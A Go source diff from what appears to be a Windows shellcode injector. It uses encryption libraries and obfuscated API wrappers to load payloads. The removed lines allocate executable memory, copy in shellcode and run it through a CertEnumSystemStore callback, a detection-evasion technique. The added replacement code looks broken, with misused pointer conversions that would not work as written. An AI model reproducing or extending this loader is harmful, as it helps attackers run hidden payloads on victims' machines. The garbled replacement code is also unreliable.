@@ -4,7 +4,6 @@ import (
 	"bufio"
 	"github.com/wumansgy/goEncrypt/aes"
 	"github.com/zngw/xor"
-	"golang.org/x/sys/windows"
 	"io"
 	"log"
 	"os"
@@ -247,23 +246,14 @@ func Inject(DLL string, export string, Pid int, shellcode []byte) {
 		); err != nil {
 			log.Fatal(err)
 		}
-		//temp := *(*[]byte)(unsafe.Pointer(&bytesToRead))
-		//copy(temp, buf[0:bytesToRead])
+		temp := make([]byte, bytesToRead)
+		srcAddr := (uintptr)(unsafe.Pointer(&buf))
+		dst := make([]byte, len(buf))
+		copy(dst, (*[1 << 30]byte)(unsafe.Pointer(srcAddr))[:len(buf)])
+		copy((*[1 << 30]byte)(temp)[:len(buf)], dst)
+
 		currentBytes := uintptr(unsafe.Pointer(&bytesToRead))
 		originalBytes1 := uintptr(unsafe.Pointer(&originalBytes))
-
-		//sys VirtualAllocNu1r(p1 uintptr,p2 uintptr,p3 uintptr,p4 uintptr) (p5 uintptr,err error) = Kernel32.VirtualAlloc
-		if addr, err = VirtualAllocNu1r(uintptr(0), uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE); err != nil {
-			log.Fatal(err)
-		}
-		srcAddr := (uintptr)(unsafe.Pointer(&shellcode[0]))
-		dst := make([]byte, len(shellcode))
-		copy(dst, (*[1 << 30]byte)(unsafe.Pointer(srcAddr))[:len(shellcode)])
-		copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode)], dst)
-		//sys CertEnumSystemStoreNu1r(p1 uintptr,p2 uintptr,p3 uintptr,p4 uintptr) (err error) = Crypt32.CertEnumSystemStore
-		if err = CertEnumSystemStoreNu1r(windows.CERT_SYSTEM_STORE_CURRENT_USER, 0, 0, addr); err != nil {
-			log.Fatal(err)
-		}
 
 		if currentBytes == originalBytes1 {
 			executed = true
